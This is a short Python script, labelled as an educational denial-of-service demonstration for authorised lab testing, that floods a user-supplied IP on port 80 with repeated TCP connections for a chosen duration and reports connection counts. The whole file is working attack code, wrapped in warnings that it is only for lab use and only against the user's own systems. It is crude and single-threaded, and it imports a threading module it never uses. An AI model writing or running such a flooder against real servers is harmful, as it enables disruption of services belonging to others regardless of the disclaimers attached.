#!/usr/bin/env python3
"""
Educational DoS Concepts - FOR AUTHORIZED TESTING ONLY
Run only in controlled lab environments
"""

import socket
import threading
import time
import sys


def connection_flood(target_ip, target_port, duration):
    """Demonstration of connection flooding concept"""
    end_time = time.time() + duration
    connections = 0

    print(f"[*] Starting test against {target_ip}:{target_port}")
    print(f"[*] Duration: {duration} seconds")

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            connections += 1
            sock.close()

            if connections % 100 == 0:
                print(f"[*] Connections made: {connections}")

        except:
            pass

    print(f"[*] Test complete. Total connections: {connections}")


# ONLY USE IN CONTROLLED LAB ENVIRONMENT
if __name__ == "__main__":
    print("⚠️  FOR EDUCATIONAL PURPOSES ONLY")
    print("Only run this against your own systems!\n")

    # Replace with YOUR test server IP
    target = input("Enter your test server IP: ")
    duration = int(input("Test duration (seconds): "))

    connection_flood(target, 80, duration)